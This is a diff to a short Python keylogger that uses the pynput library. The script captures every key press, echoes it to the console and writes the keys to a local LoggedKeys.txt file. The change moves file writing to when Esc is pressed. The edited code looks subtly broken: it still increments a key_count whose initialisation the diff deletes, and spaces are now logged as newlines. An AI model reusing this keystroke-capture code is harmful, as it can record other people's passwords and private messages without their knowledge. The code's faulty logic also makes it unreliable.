@@ -2,8 +2,8 @@ from pynput import keyboard
 
 
 keylogsfile=open("LoggedKeys.txt",'a')
-key_count=0
 keys=[]
+
 
 
 def pressed(key):
@@ -19,16 +19,14 @@ def pressed(key):
         print('special key {0} pressed'.format(key))
         keys.append(key)
         key_count+=1
-    
-    if(key_count>=5):
-        write_File(keys)
-        key_count=0
-        keys=[]    
+
+   
   
 
 def released(key):
     print('{0} released'.format( key))
     if key == keyboard.Key.esc:
+        write_File(keys)
         keylogsfile.close()
         return False
     
@@ -36,18 +34,11 @@ def released(key):
 def write_File(key):
     for key in keys:
         if(key==keyboard.Key.space):
-            keylogsfile.write(" ")
-            continue
-        
-        elif(key==keyboard.Key.enter):
             keylogsfile.write("\n")
             continue
-        
+    
         keylogsfile.write(str(key))
 
 with keyboard.Listener( on_press=pressed, on_release=released) as listener:
     listener.join()
-    
-   
-    
     
